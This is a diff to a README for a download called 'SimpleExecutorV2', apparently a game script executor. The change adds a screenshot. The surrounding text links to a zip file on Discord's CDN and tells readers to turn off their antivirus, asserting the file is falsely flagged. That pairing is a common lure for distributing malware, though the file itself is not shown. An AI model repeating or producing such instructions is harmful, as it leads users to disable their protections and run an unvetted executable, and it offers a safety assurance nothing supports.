@@ -4,6 +4,9 @@
 
 Download Link: [https://cdn.discordapp.com/attachments/929790736906461244/931602867855446056/SimpleExecutorV2.zip]
 
+Screenshot Of Executor:
+<img src="images/SCREENSHOT59.png" alt="ScreenShot" width="1280" height="720">
+
 ## Guide:
 - Turn Off Your AntiVirus (no virus, it's just flagged as a virus)
 - Download The Executor (of course dummy)
